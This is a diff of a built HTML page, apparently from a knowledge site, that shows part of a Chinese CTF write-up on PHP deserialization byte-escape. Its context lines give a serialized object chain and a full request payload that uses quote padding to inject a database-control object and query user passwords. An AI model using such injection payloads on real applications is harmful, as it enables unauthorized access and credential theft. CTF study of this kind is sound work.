@@ -14,10 +14,10 @@
     </script>
     
     <!--loadable-components prefetch  -->
-    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.e0fbc71b.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.e0fbc71b.js">
-<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.e0fbc71b.js">
-<link data-chunk="knowledge/ctf/deserialize-byte-escape.md" rel="preload" as="script" href="/assets/js/knowledge/ctf/deserialize-byte-escape.md.e0fbc71b.js"> 
+    <link data-chunk="app" rel="preload" as="script" href="/assets/js/app.59105602.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/vendors~LayoutWrapper.59105602.js">
+<link data-chunk="LayoutWrapper" rel="preload" as="script" href="/assets/js/LayoutWrapper.59105602.js">
+<link data-chunk="knowledge/ctf/deserialize-byte-escape.md" rel="preload" as="script" href="/assets/js/knowledge/ctf/deserialize-byte-escape.md.59105602.js"> 
     <style>pre[class*="language-"].line-numbers {
 	position: relative;
 	padding-left: 3.8em;
@@ -26720,9 +26720,9 @@ echo serialize($U);
 ?&gt;</code></pre></div><p>之后作为 CtrlCase 的值传入</p><div class="rcpress-highlight" data-language="text"><pre class="language-text"><code class="language-text">&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}</code></pre></div><p>一共 443 字节</p><p>用 80 个单引号和三个 union 挤出这部分</p><p>完整payload</p><div class="rcpress-highlight" data-language="text"><pre class="language-text"><code class="language-text">age=&amp;nickname=&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;unionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}</code></pre></div></section><section class="prev-next-nav"></section></article></div></div></div></div></div></div></div>
      <!--loadable-components render area  -->
     <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json">[56,0,14]</script>
-<script async data-chunk="app" src="/assets/js/app.e0fbc71b.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.e0fbc71b.js"></script>
-<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.e0fbc71b.js"></script>
-<script async data-chunk="knowledge/ctf/deserialize-byte-escape.md" src="/assets/js/knowledge/ctf/deserialize-byte-escape.md.e0fbc71b.js"></script>
+<script async data-chunk="app" src="/assets/js/app.59105602.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/vendors~LayoutWrapper.59105602.js"></script>
+<script async data-chunk="LayoutWrapper" src="/assets/js/LayoutWrapper.59105602.js"></script>
+<script async data-chunk="knowledge/ctf/deserialize-byte-escape.md" src="/assets/js/knowledge/ctf/deserialize-byte-escape.md.59105602.js"></script>
   </body>
 </html>
